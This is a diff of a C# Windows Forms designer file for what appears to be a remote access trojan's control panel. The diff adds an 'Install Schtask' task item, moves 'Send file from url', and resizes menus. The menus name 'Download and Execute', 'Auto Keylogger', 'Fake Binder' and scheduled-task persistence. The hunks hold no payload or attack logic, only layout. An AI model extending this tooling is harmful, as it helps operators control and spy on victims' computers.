@@ -97,6 +97,7 @@
             this.sTOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.ThumbnailImageList = new System.Windows.Forms.ImageList(this.components);
             this.contextMenuTasks = new System.Windows.Forms.ContextMenuStrip(this.components);
+            this.sendFileFromUrlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.downloadAndExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.sENDFILETOMEMORYToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.uPDATEToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
@@ -143,7 +144,7 @@
             this.listView2 = new System.Windows.Forms.ListView();
             this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.sendFileFromUrlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.installSchtaskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.contextMenuClient.SuspendLayout();
             this.statusStrip1.SuspendLayout();
             this.contextMenuLogs.SuspendLayout();
@@ -433,14 +434,14 @@
             // StartToolStripMenuItem2
             // 
             this.StartToolStripMenuItem2.Name = "StartToolStripMenuItem2";
-            this.StartToolStripMenuItem2.Size = new System.Drawing.Size(103, 22);
+            this.StartToolStripMenuItem2.Size = new System.Drawing.Size(180, 22);
             this.StartToolStripMenuItem2.Text = "Start";
             this.StartToolStripMenuItem2.Click += new System.EventHandler(this.StartToolStripMenuItem2_Click);
             // 
             // StopToolStripMenuItem3
             // 
             this.StopToolStripMenuItem3.Name = "StopToolStripMenuItem3";
-            this.StopToolStripMenuItem3.Size = new System.Drawing.Size(103, 22);
+            this.StopToolStripMenuItem3.Size = new System.Drawing.Size(180, 22);
             this.StopToolStripMenuItem3.Text = "Stop";
             this.StopToolStripMenuItem3.Click += new System.EventHandler(this.StopToolStripMenuItem3_Click);
             // 
@@ -462,7 +463,7 @@
             this.UninstallToolStripMenuItem,
             this.ClientFolderToolStripMenuItem});
             this.ClientControlToolStripMenuItem.Name = "ClientControlToolStripMenuItem";
-            this.ClientControlToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
+            this.ClientControlToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.ClientControlToolStripMenuItem.Text = "Client Control";
             // 
             // StopToolStripMenuItem1
@@ -507,7 +508,7 @@
             this.RebootToolStripMenuItem,
             this.LogoutToolStripMenuItem});
             this.SystemToolStripMenuItem.Name = "SystemToolStripMenuItem";
-            this.SystemToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
+            this.SystemToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.SystemToolStripMenuItem.Text = "System";
             // 
             // ShutDownToolStripMenuItem
@@ -582,14 +583,14 @@
             // SchtaskInstallToolStripMenuItem
             // 
             this.SchtaskInstallToolStripMenuItem.Name = "SchtaskInstallToolStripMenuItem";
-            this.SchtaskInstallToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
+            this.SchtaskInstallToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.SchtaskInstallToolStripMenuItem.Text = "Schtask Install";
             this.SchtaskInstallToolStripMenuItem.Click += new System.EventHandler(this.SchtaskInstallToolStripMenuItem_Click);
             // 
             // SchtaskUninstallToolStripMenuItem
             // 
             this.SchtaskUninstallToolStripMenuItem.Name = "SchtaskUninstallToolStripMenuItem";
-            this.SchtaskUninstallToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
+            this.SchtaskUninstallToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.SchtaskUninstallToolStripMenuItem.Text = "Schtask Uninstall";
             this.SchtaskUninstallToolStripMenuItem.Click += new System.EventHandler(this.SchtaskUninstallToolStripMenuItem_Click);
             // 
@@ -691,6 +692,7 @@
             this.sendFileFromUrlToolStripMenuItem,
             this.downloadAndExecuteToolStripMenuItem,
             this.sENDFILETOMEMORYToolStripMenuItem1,
+            this.installSchtaskToolStripMenuItem,
             this.uPDATEToolStripMenuItem1,
             this.autoKeyloggerToolStripMenuItem,
             this.fakeBinderToolStripMenuItem,
@@ -698,7 +700,14 @@
             this.dELETETASKToolStripMenuItem});
             this.contextMenuTasks.Name = "contextMenuStrip4";
             this.contextMenuTasks.ShowImageMargin = false;
-            this.contextMenuTasks.Size = new System.Drawing.Size(170, 186);
+            this.contextMenuTasks.Size = new System.Drawing.Size(170, 208);
+            // 
+            // sendFileFromUrlToolStripMenuItem
+            // 
+            this.sendFileFromUrlToolStripMenuItem.Name = "sendFileFromUrlToolStripMenuItem";
+            this.sendFileFromUrlToolStripMenuItem.Size = new System.Drawing.Size(169, 22);
+            this.sendFileFromUrlToolStripMenuItem.Text = "Send file from url";
+            this.sendFileFromUrlToolStripMenuItem.Click += new System.EventHandler(this.sendFileFromUrlToolStripMenuItem_Click);
             // 
             // downloadAndExecuteToolStripMenuItem
             // 
@@ -1080,12 +1089,12 @@
             this.columnHeader2.Text = "Logs";
             this.columnHeader2.Width = 705;
             // 
-            // sendFileFromUrlToolStripMenuItem
+            // installSchtaskToolStripMenuItem
             // 
-            this.sendFileFromUrlToolStripMenuItem.Name = "sendFileFromUrlToolStripMenuItem";
-            this.sendFileFromUrlToolStripMenuItem.Size = new System.Drawing.Size(169, 22);
-            this.sendFileFromUrlToolStripMenuItem.Text = "Send file from url";
-            this.sendFileFromUrlToolStripMenuItem.Click += new System.EventHandler(this.sendFileFromUrlToolStripMenuItem_Click);
+            this.installSchtaskToolStripMenuItem.Name = "installSchtaskToolStripMenuItem";
+            this.installSchtaskToolStripMenuItem.Size = new System.Drawing.Size(169, 22);
+            this.installSchtaskToolStripMenuItem.Text = "Install Schtask";
+            this.installSchtaskToolStripMenuItem.Click += new System.EventHandler(this.installSchtaskToolStripMenuItem_Click);
             // 
             // Form1
             // 
@@ -1243,6 +1252,7 @@
         private System.Windows.Forms.ToolStripMenuItem netstatToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem fromUrlToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem sendFileFromUrlToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem installSchtaskToolStripMenuItem;
     }
 }
 
